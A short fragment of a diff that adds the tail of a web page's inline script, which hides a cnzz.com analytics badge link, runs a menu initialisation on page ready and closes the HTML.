+ 'menu_admin'};
+document.querySelector('a[href="http://www.cnzz.com/stat/website.php?web_id=1260716569"]').style.visibility
+ = 'hidden';
+window.onReady(
+	function(){
+		read.InitMenu();
+	}
+);
+WINDOW_LOADED=1;
+</script>
+</body></html>
